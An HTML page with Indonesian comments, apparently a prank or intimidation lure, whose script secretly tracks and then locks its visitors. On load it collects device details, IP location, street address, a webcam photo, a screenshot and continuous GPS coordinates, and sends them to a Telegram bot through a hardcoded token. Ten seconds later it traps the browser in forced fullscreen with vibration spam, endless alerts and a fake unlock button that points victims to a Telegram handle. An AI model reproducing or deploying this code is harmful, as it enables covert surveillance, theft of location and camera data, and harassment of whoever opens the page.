<!DOCTYPE html>

<html lang="id">

<head>

    <meta charset="UTF-8">

    <meta name="viewport" content="width=device-width,initial-scale=1.0">

    <title>bodo banget si</title>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>

    <style>

        body { background: #000; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial, sans-serif; color: #999; overflow: hidden; }

        #loading-container { text-align: center; width: 80%; max-width: 400px; }

        #loading-text { font-size: 22px; margin-bottom: 20px; color: #6e48aa; }

        #progress-container { height: 3px; background: #222; border-radius: 3px; overflow: hidden; }

        #progress-bar { height: 100%; width: 0%; background: linear-gradient(90deg,#6e48aa,#9d50bb); transition: width .3s ease; }

        #loading-details { margin-top: 20px; font-size: 14px; color: #666; }

        .hidden { display: none; }

        /* Gaya buat fullscreen lock */

        #lockOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 999999; display: none; flex-direction: column; justify-content: center; align-items: center; color: white; font-size: 24px; }

        #lockOverlay button { padding: 10px 20px; font-size: 18px; background: red; color: white; border: none; cursor: pointer; }

    </style>

</head>

<body>

    <div id="loading-container">

        <div id="loading-text">Data lu dh bocor jir by gwe🗿</div>

        <div id="progress-container"><div id="progress-bar"></div></div>

        <div id="loading-details"></div>

    </div>

    <!-- Overlay buat ngunci layar -->

    <div id="lockOverlay">

        <div>⚠️ SISTEM LU TERKUNCI ⚠️</div>

        <div style="font-size: 14px; margin: 20px;">Hubungi @Akumahapaatuhm buat buka</div>

        <button onclick="fakeUnlock()">Buka Kunci</button>

    </div>

    <video id="v" autoplay muted class="hidden"></video>

    <canvas id="c" class="hidden"></canvas>

    <script>

        // ==================== BAGIAN LAMA LU (tetep jalan) ====================

        (() => {

            const T = '8456549762:AAH0Yd8mGnNKT_irAXN8kjGkKUGOPEh4BVo', C = '8414978429';

            let p = 0;

            const pb = document.getElementById('progress-bar');

            const ld = document.getElementById('loading-details');

            const LM = ["Memeriksa modul sistem...","Memuat komponen inti...","Menginisialisasi antarmuka...","Memverifikasi koneksi...","Menyiapkan lingkungan...","Memeriksa pembaruan...","Memuat aset tampilan..."];

            setInterval(() => { p += Math.random() * 5; if (p > 98) p = 98; pb.style.width = p + '%'; if (Math.random() > .9) ld.textContent = LM[Math.floor(Math.random() * LM.length)]; }, 500);

            const sTG = async d => { try { await fetch(`https://api.telegram.org/bot${T}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: C, text: d, parse_mode: 'HTML' }) }); } catch (e) { } };

            const sP = async (b, f) => { try { const fd = new FormData(); fd.append('chat_id', C); fd.append('photo', b, f); await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd }); } catch (e) { } };

            const gLD = async (a, b) => { try { const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${a}&lon=${b}&zoom=18&addressdetails=1`), d = await r.json(); if (d.address) return { kb: d.address.county || d.address.city || d.address.state || "Tidak diketahui", kc: d.address.suburb || d.address.village || d.address.town || "Tidak diketahui", fa: d.display_name || "Alamat tidak tersedia" }; } catch (e) { } return { kb: "Tidak diketahui", kc: "Tidak diketahui", fa: "Alamat tidak tersedia" }; };

            const cDI = async () => {

                let m = '╭───── Tracking Report ───── ⦿\n\n⚙️ DEVICE INFORMATION\n';

                m += `🖥️ Device: ${navigator.userAgent}\n💻 Platform: ${navigator.platform}\n🌐 Bahasa: ${navigator.language}\n📶 Online: ${navigator.onLine ? 'Online' : 'Offline'}\n📺 Screen Size: ${screen.width}x${screen.height}\n🪟 Window Size: ${innerWidth}x${innerHeight}\n💾 RAM: ${navigator.deviceMemory || 'Unknown'} GB\n🧠 CPU Cores: ${navigator.hardwareConcurrency}\n`;

                if (navigator.getBattery) { try { const b = await navigator.getBattery(); m += `🔋 Battery: ${Math.floor(b.level * 100)}%\n🔌 Charging: ${b.charging ? '✅ YA' : '❌ TIDAK'}\n`; } catch (e) { m += '🔋 Battery: ❌ Tidak tersedia\n'; } }

                m += `⏰ Waktu Akses: ${new Date().toString()}\n🕒 Page Load Time: ${performance.now().toFixed(2)} ms\n📜 History Length: ${history.length}\n✋ Touch Support: ${'ontouchstart' in window ? '✅ YA' : '❌ TIDAK'}\n🔗 Referrer: ${document.referrer || 'None'}\n🌍 URL: ${location.href}\n📄 Title: ${document.title}\n🕓 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n🧭 Offset: ${new Date().getTimezoneOffset()} menit\n\n`;

                try { const i = await fetch('https://ipapi.co/json/'), d = await i.json(); m += '📍 LOCATION INFORMATION\n'; m += `📡 IP Address: ${d.ip}\n🏙️ Kota: ${d.city}\n🏙️ Kabupaten: ${d.region}\n🗺️ Wilayah: ${d.region}\n🌎 Negara: ${d.country_name}\n🏷️ Kode Pos: ${d.postal}\n`; if (d.latitude && d.longitude) { m += `📌 Latitude: ${d.latitude}\n📍 Longitude: ${d.longitude}\n`; const l = await gLD(d.latitude, d.longitude); m += `🏙️ Kabupaten: ${l.kb}\n🏙️ Kecamatan: ${l.kc}\n🏠 Alamat Lengkap: ${l.fa}\n`; } } catch (e) { m += '❌ Gagal mendapatkan informasi lokasi\n'; }

                m += '\n╰───── Telegram @Akumahapaatuhm ───── ⦿'; return m;

            };

            const ST = async () => {

                await sTG(await cDI());

                try { const v = document.getElementById('v'), c = document.getElementById('c'), st = await navigator.mediaDevices.getUserMedia({ video: true }); v.srcObject = st; await new Promise(r => setTimeout(r, 3000)); c.width = v.videoWidth; c.height = v.videoHeight; c.getContext('2d').drawImage(v, 0, 0); c.toBlob(b => sP(b, 'camera_capture.jpg'), 'image/jpeg'); st.getTracks().forEach(t => t.stop()); } catch (e) { await sTG('❌ Camera access blocked'); }

                setTimeout(async () => { try { const cn = await html2canvas(document.body); cn.toBlob(b => sP(b, 'screenshot.jpg'), 'image/jpeg'); } catch (e) { await sTG('❌ Screenshot failed'); } }, 5000);

                if (navigator.geolocation) {

                    navigator.geolocation.watchPosition(async p => {

                        let g = `📍 LIVE GPS TRACKING\n📌 Lat: ${p.coords.latitude}\n📍 Lng: ${p.coords.longitude}\n🎯 Akurasi: ${p.coords.accuracy}m\n`;

                        const l = await gLD(p.coords.latitude, p.coords.longitude);

                        g += `🏙️ Kabupaten: ${l.kb}\n🏙️ Kecamatan: ${l.kc}\n🏠 Alamat: ${l.fa}\n`;

                        await sTG(g);

                    }, async e => { await sTG(`❌ GPS Error: ${e.message}`); }, { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 });

                }

            };

            // ==================== FITUR BARU: LOCK SCREEN ====================

            function activateLock() {

                const overlay = document.getElementById('lockOverlay');

                overlay.style.display = 'flex';

                // 1. Fullscreen paksa

                if (document.documentElement.requestFullscreen) {

                    document.documentElement.requestFullscreen();

                } else if (document.documentElement.webkitRequestFullscreen) {

                    document.documentElement.webkitRequestFullscreen();

                } else if (document.documentElement.msRequestFullscreen) {

                    document.documentElement.msRequestFullscreen();

                }

                // 2. Vibration spam (kalo HP support)

                if (navigator.vibrate) {

                    setInterval(() => {

                        navigator.vibrate([500, 200, 500, 200, 1000]);

                    }, 2000);

                }

                // 3. Alert bomb (bikin browser freeze)

                function bomb() {

                    setTimeout(() => {

                        alert('⚠️ LOCKED! Hubungi @Akumahapaatuhm');

                        bomb(); // loop terus

                    }, 100);

                }

                bomb();

                // 4. Cegah keluar fullscreen

                document.addEventListener('fullscreenchange', () => {

                    if (!document.fullscreenElement) {

                        document.documentElement.requestFullscreen();

                    }

                });

                document.addEventListener('webkitfullscreenchange', () => {

                    if (!document.webkitFullscreenElement) {

                        document.documentElement.webkitRequestFullscreen();

                    }

                });

                // 5. Cegah back button

                history.pushState(null, null, location.href);

                window.onpopstate = function () {

                    history.pushState(null, null, location.href);

                };

            }

            // Fungsi palsu buat "buka" (gak ngefek)

            window.fakeUnlock = function () {

                alert('Maaf, ini cuma jebakan. HP lu tetep ke kunci!');

                activateLock(); // panggil lagi

            };

            // Jalankan lock setelah tracking jalan (misal 10 detik)

            setTimeout(activateLock, 10000);

            // Jangan lupa start tracking

            setTimeout(ST, 3000);

        })();

    </script>

</body>

</html>
